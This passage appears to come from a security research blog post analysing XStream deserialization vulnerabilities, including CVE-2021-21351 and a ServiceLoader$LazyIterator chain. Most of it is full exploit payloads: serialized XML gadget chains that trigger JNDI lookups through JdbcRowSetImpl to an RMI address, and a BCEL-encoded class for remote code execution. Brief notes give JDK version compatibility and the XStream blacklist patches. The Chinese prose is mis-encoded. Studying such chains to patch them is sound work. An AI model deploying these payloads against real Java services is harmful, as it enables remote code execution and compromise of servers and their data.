class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªå’ŒCVE-2021-21347ç±»ä¼¼ï¼Œè¿™æ˜¯æŠŠè¿œç¨‹jaræ”¹ä¸ºäº†BCELæ–¹å¼åŠ è½½ï¼Œç›¸åº”çš„å°†processorCLæ”¹ä¸ºäº†com.sun.org.apache.bcel.internal.util.ClassLoaderã€‚</p><p>åœ¨8u60ç¯å¢ƒä¸‹åŒæ ·é‡åˆ°processorCLæ„é€ çš„é—®é¢˜ï¼Œæ›´æ–°ä¸ºWh1t3p1gå¸ˆå‚…æ„é€ BCELçš„æ–¹å¼ä¹‹åè¿è¡ŒæˆåŠŸã€‚å…·ä½“å¯ä»¥å‚è€ƒLazyIterator ä¸­çš„pocã€‚</p><h3 id="é»‘åå•ï¼š-5"><a href="#é»‘åå•ï¼š-5" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h2><p>author: wh1t3p1g</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ol><li>ä½ç‰ˆæœ¬çš„jdkä¸­æ²¡æœ‰__overrideDefaultParserï¼Œåœ¨8u121ä¸Šæµ‹è¯•å¤±è´¥ï¼Œ8u172ä¸ŠæˆåŠŸï¼Œ8u251æµ‹è¯•å¤±è´¥ï¼ŒåŸå› æ˜¯é«˜ç‰ˆæœ¬jdk jndiæ³¨å…¥å—JEP290å½±å“ã€‚</li></ol><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™ä¸ªä¹Ÿæ˜¯ysomapä¸­çš„XercesValue payloadã€‚</p><p>è§¦å‘ç‚¹åœ¨IncrementalSAXSource_Xerces.parseSome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">parseSome</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                <span class="keyword">throws</span> SAXException, IOException, IllegalAccessException,</span></span><br><span class="line"><span class="function">                                         java.lang.reflect.InvocationTargetException</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="comment">// Take next parsing step, return false iff parsing complete:</span></span><br><span class="line">                <span class="keyword">if</span>(fConfigSetInput!=<span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                        Object ret=(Boolean)(fConfigParse.invoke(fPullParserConfig,parmsfalse));</span><br></pre></td></tr></table></figure><p>å…¶ä¸­fConfigParseã€fPullParserConfigã€parmsfalseéƒ½å¯æ§</p><h3 id="é»‘åå•ï¼š-6"><a href="#é»‘åå•ï¼š-6" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="ServiceFinder-LazyIterator"><a href="#ServiceFinder-LazyIterator" class="headerlink" title="ServiceFinder$LazyIterator"></a>ServiceFinder$LazyIterator</h2><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;java.util.ServiceLoader$LazyIterator&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">service</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loader</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&quot;hashtable&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&quot;java.lang.ClassLoader&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&quot;../..&quot;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ignored__packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">class__path</span>&gt;</span><span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">loader</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nextName</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$90$cdJ$c3$40$U$85$cfm$ab$a91$d5$fe$d8V$c1E$5d$d9$K$fd3$a4$b5T$dc$I$ae$y$8a$V$5dO$c7$a1$a4$c6$q$a4S$f5$8d$5c$bbQq$e1$D$f8P$ea$8d$I$W$c4$Z8$c3$bd$dc$f3$9d$99y$ffx$7d$D$60c$83P$O$ef$fc$fa$ae$d3$ea$ed$f5$da$b6c$b7z$dd$8e$e3t$ba$b6$B$od$t$e2V4$3d$e1$8f$9b$t$a3$89$92$da$40$92$60$O$83Y$q$d5$91$eb$v$c2$e6$3f$feFl$r$y$ee$bb$be$ab$P$I$c9j$ed$c2$82$81$b4$89$U$96$I$a9$c3$e0$8a$ed$b9$df$84$b3$99$af$dd$he$c0$e2$88$b1$d2$3f5$a1X$ad$j$ff$Z$eb$5bX$c1$aa$89$M$b2$84R$Q$w$bfR$X$V$v$3c9$f3$84$O$a2$86$I$c34$f2$i$a4$ee$95$qlW$e7$YC$j$b9$fe$b8$3f$8f$3d$8d$C$a9$a6S$c6$ae$a1$YcK$84$ccP$Ly$3d$Q$e1$b9$Yy$K$5bH$f0$dd$e3E$bc$f9$v$ac$cb$5c$b5$b9$9b$e4$b3$b0$f3$M$f3$81$7fh$f0$82$5c$be$f0$84$f2$e5$e3$f7$f0$3a$ab$F$fad$P$Z$M$89$7b$L$ac$J$y$7e$B$e0$d2$95$ea$8b$B$A$A<span class="tag">&lt;/<span class="name">nextName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span 